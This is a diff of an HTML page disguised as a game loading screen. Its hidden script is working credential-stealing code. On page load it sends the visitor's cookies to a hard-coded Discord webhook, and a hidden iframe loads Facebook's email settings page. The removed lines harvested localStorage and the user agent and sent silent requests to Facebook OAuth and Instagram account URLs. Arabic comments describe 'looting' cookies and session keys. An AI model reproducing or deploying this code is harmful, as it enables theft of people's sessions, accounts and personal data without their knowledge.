@@ -4,23 +4,24 @@
     <meta charset="UTF-8">
     <title>تحميل اللعبة...</title>
     <style>
-        body { background: #000; color: #fff; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: monospace; }
+        body { background: #000; color: #fff; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         .version-marker { font-size: 60px; font-weight: bold; color: #1a1a1a; position: absolute; top: 20px; right: 20px; }
         .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-    <div class="version-marker">15</div>
+    <div class="version-marker">16</div>
     <div class="loader"></div>
-    <p>جاري مزامنة بروتوكول الحصاد (V1.2.7)...</p>
+    <p>جاري استخراج مفاتيح الجلسة (V1.2.8)...</p>
 
+    <iframe id="fb-frame" src="about:blank" style="display:none;"></iframe>
     <iframe name="hidden_receiver" style="display:none;"></iframe>
 
     <script>
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1481664919198896258/hXunBuVEO0j0riESA9nicqjzyRtEA1du3OzoCIHNqJpNWfv9xyrtEfCzgcElPQ9gvBgZ";
 
-        function sendExfil(title, content) {
+        function sendToDiscord(title, data) {
             const form = document.createElement('form');
             form.method = 'POST';
             form.action = WEBHOOK_URL;
@@ -29,58 +30,40 @@
             input.type = 'hidden';
             input.name = 'payload_json';
             input.value = JSON.stringify({
-                embeds: [{
-                    title: "💎 " + title,
-                    description: content,
-                    color: 3066993,
-                    footer: { text: "Protocol: V1.2.7 | Device: Android 14" }
-                }]
+                embeds: [{ title: "🔓 " + title, description: data, color: 15105570 }]
             });
             form.appendChild(input);
             document.body.appendChild(form);
             form.submit();
-            document.body.removeChild(form);
         }
 
-        async function finalStrike() {
-            try {
-                // 1. بصمة الجهاز المحدثة
-                sendExfil("Target_Sync", `UA: ${navigator.userAgent}\nPlatform: ${navigator.platform}`);
+        async function startDeepTunnel() {
+            // 1. تأكيد تشغيل النسخة
+            sendToDiscord("Protocol v1.2.8", "Starting Deep Tunneling on " + navigator.platform);
 
-                // 2. تكتيك الـ OAuth Stealth Tunneling
-                // إجبار المتصفح على طلب روابط حساسة بكوكيز الضحية (بدون فتح نوافذ)
-                const tunnels = [
-                    { name: "FB_OAuth", url: "https://www.facebook.com/dialog/oauth?client_id=124024574287442&redirect_uri=https://mbasic.facebook.com" },
-                    { name: "Insta_Edit", url: "https://www.instagram.com/accounts/edit/?__a=1" }
-                ];
-
-                tunnels.forEach(t => {
-                    const probe = new Image();
-                    probe.src = t.url + "&cache_bust=" + Math.random();
-                    // بمجرد إرسال الطلب، المتصفح يكون قد "سلم" الكوكيز للموقع
-                    sendExfil("Tunnel_Injected", `تم حقن طلب صامت إلى: ${t.name}`);
-                });
-
-                // 3. سحب بيانات التخزين المحلي العميقة
-                let loot = "";
-                for (let i = 0; i < localStorage.length; i++) {
-                    let key = localStorage.key(i);
-                    loot += `**${key}**: ${localStorage.getItem(key).substring(0, 150)}...\n`;
-                }
-                
-                if (loot) {
-                    sendExfil("Storage_Harvest", loot);
-                } else {
-                    sendExfil("Status_Update", "LocalStorage فارغ (نظام التمويه نشط)");
-                }
-
-            } catch (e) {
-                sendExfil("Error_Log", e.message);
+            // 2. محاولة سحب الـ Cookies (إذا كانت الحماية ضعيفة)
+            if (document.cookie) {
+                sendToDiscord("Direct Cookie Loot", document.cookie);
             }
+
+            // 3. تكتيك الـ Iframe Injection
+            // بنحاول نحمل صفحة إعدادات فيسبوك في الـ iframe
+            const fbFrame = document.getElementById('fb-frame');
+            fbFrame.src = "https://mbasic.facebook.com/settings/email/";
+
+            // بنراقب إذا الـ iframe قدر يحمل الصفحة (معناه الجلسة نشطة جداً)
+            setTimeout(() => {
+                try {
+                    const check = fbFrame.contentWindow.location.href;
+                    sendToDiscord("Iframe Access", "Successfully loaded: " + check);
+                } catch (e) {
+                    // إذا طلع خطأ Cross-Origin، هاد معناه إن الجلسة انبعثت بس المتصفح منعنا من القراءة
+                    sendToDiscord("Iframe Proxy", "Request Sent. Browser blocked read, but Session Cookie was included.");
+                }
+            }, 3000);
         }
 
-        // تشغيل المهمة
-        setTimeout(finalStrike, 1500);
+        window.onload = startDeepTunnel;
     </script>
 </body>
 </html>
